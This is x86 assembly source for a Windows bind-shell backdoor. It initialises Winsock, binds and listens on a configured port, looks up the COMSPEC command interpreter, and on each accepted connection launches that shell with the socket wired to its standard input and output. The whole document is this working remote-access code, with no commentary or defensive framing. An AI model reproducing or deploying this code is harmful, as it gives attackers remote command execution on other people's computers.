.data
aCom	db	"COMSPEC",0

.code
StartSrv proc Param:DWORD
	sub esp,190h
	lea eax,[esp+0]
	
	push eax
	push 2
	call WSAStartup
	
	call spawn
	
	push 0
	call ExitProcess
	
	
spawn:
	push ebp
	mov ebp,esp
	sub esp,180h
	push esi
	push edi
	xor edi,edi
	push edi
	push edi
	push edi
	push edi	
	push 1
	push 2
	call WSASocketA
	
	mov [ebp-4], eax
	mov [ebp-14h], edi
	mov word ptr [ebp-18h], 2
	mov ax,PORT
	xchg ah,al
	mov [ebp-16h], ax
	
	lea eax,[ebp-18h]
	push 10h
	push eax
	push [ebp-4]
	call bind
	
	push 0ah
	push [ebp-4]
	call listen
	lea eax,[ebp-180h]
	push 104h
	push eax
	lea eax, aCom
	push eax
	call GetEnvironmentVariableA
connection:
	lea eax,[ebp-8]
	mov ecx, 10h
	mov [ebp-8], ecx
	
	push eax
	lea eax,[ebp-28h]
	push eax
	push [ebp-4]
	call accept
	mov esi,eax
	cmp esi,edi
	jz short connection
	
	lea eax,[ebp-7Ch]
	push eax
	call GetStartupInfoA
	lea eax,[ebp-38h]
	mov dword ptr [ebp-50h], 101h
	
	push eax
	lea eax,[ebp-7ch]
	push eax
	push edi
	push edi
	push 10h
	push 1
	push edi
	push edi
	lea eax, [ebp-180h]
	push edi
	push eax
	
	mov [ebp-4ch],di
	mov [ebp-44h],esi
	mov [ebp-40h],esi
	mov [ebp-3ch],esi
	
	call CreateProcessA
	test eax,eax
	jnz quit
	
	push 2
	push esi
	call shutdown
	jmp short connection
quit:
	push esi
	call closesocket
	jmp short connection
StartSrv endp
